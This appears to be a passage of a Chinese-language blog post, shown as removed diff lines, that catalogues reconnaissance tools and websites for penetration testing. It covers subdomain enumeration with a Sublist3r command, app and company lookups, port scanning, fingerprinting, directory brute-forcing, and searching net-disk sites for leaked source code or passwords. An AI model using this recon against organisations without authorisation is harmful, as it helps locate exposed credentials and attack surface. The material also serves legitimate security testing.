-<li>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sublist3r.py -d 6pian.cn -o xxx.cn-sublist3r.txt</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DNSdumpster：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li>
-<li>在线域名爆破：<a href="http://z.zcjun.com/">http://z.zcjun.com</a></li>
-<li>小蓝本：<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></li>
-<li>谷歌语法：site:url.com</li>
-</ul>
-<h3 id="APP信息收集"><a href="#APP信息收集" class="headerlink" title="APP信息收集"></a>APP信息收集</h3><ul>
-<li>七麦数据：<a href="https://www.qimai.cn/">https://www.qimai.cn/</a></li>
-</ul>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401003223994-2015673218.png" alt="image-20220401003224149"></p>
-<ul>
-<li>小蓝本：<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></li>
-</ul>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401003436145-1522334794.png" alt="image-20220401003436333"></p>
-<ul>
-<li>AppStore：<a href="https://apps.apple.com/">https://apps.apple.com/</a></li>
-</ul>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401004923689-1032764987.png" alt="image-20220401004923517"></p>
-<ul>
-<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
-</ul>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011632625-394917638.png" alt="image-20220401011632788"></p>
-<ul>
-<li>点点：<a href="https://app.diandian.com/">https://app.diandian.com/</a></li>
-</ul>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011706699-1039405072.png" alt="image-20220401011706880"></p>
-<h3 id="公众号收集"><a href="#公众号收集" class="headerlink" title="公众号收集"></a>公众号收集</h3><ul>
-<li>搜狗搜索引擎：<a href="https://weixin.sogou.com/weixin">https://weixin.sogou.com/weixin</a></li>
-</ul>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401005726464-268705547.png" alt="image-20220401005725553"></p>
-<ul>
-<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
-</ul>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401005946939-1109072144.png" alt="image-20220401005947045"></p>
-<ul>
-<li>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li>
-</ul>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011237675-182402682.png" alt="image-20220401011237714"></p>
-<h3 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h3><ul>
-<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
-</ul>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011528721-1750840481.png" alt="image-20220401011528606"></p>
-<h3 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h3><ul>
-<li>Nmap、Masscan：Github上面有一款工具将Nmap和Masscan集成起来，先用Masscan批量扫端口，然后用Nmap识别服务。下载地址：<a href="https://github.com/cwkiller/masscan_to_nmap">https://github.com/cwkiller/masscan_to_nmap</a></li>
-<li>小米范WEB查找器</li>
-<li>Fofa、Shodan、ZoomEye</li>
-<li>利用GoogleHacking</li>
-</ul>
-<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><ul>
-<li>BugScaner：<a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a></li>
-<li>潮汐指纹：<a href="http://finger.tidesec.com/">http://finger.tidesec.com</a></li>
-<li>Kscan：<a href="https://github.com/lcvvvv/kscan">https://github.com/lcvvvv/kscan</a></li>
-<li>dismap：<a href="https://github.com/zhzyker/dismap">https://github.com/zhzyker/dismap</a></li>
-<li>Ehole：<a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></li>
-<li>ObserverWard：<a href="https://github.com/0x727/ObserverWard">https://github.com/0x727/ObserverWard</a></li>
-<li>scaninfo：<a href="https://github.com/redtoolskobe/scaninfo">https://github.com/redtoolskobe/scaninfo</a></li>
-<li>whatweb：<a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></li>
-<li>TideFinger：<a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></li>
-</ul>
-<h3 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h3><ul>
-<li>github</li>
-<li>网盘搜索</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">盘多多：http://www.panduoduo.net/</span><br><span class="line">盘搜搜：http://www.pansoso.com/</span><br><span class="line">盘搜：http://www.pansou.com/</span><br><span class="line">凌云风搜索：https://www.lingfengyun.com/</span><br><span class="line">直接输入厂商名字然后搜索，可以看看是否泄露了源码，或者什么账号密码之类的</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>路径扫描</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch：https://github.com/maurosoria/dirsearch</span><br><span class="line">dirmap：https://github.com/H4ckForJob/dirmap</span><br><span class="line">御剑后台扫描</span><br><span class="line">7kbscan：https://github.com/7kbstorm/7kbscan-WebPathBrute</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>基于证书</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://myssl.com</span><br><span class="line">https://crt.sh/</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>基于shodan找到带有该icon的网站</li>
-</ul>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/a_6M0h-7l9-IKG5F5Nar8g">https://mp.weixin.qq.com/s/a_6M0h-7l9-IKG5F5Nar8g</a></p>
-<p><a href="https://mp.weixin.qq.com/s/uUrlBrwcPPPr6s1yFeGP1A">https://mp.weixin.qq.com/s/uUrlBrwcPPPr6s1yFeGP1A</a></p>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>工具</tag>
       </tags>
   </entry>
 </search>
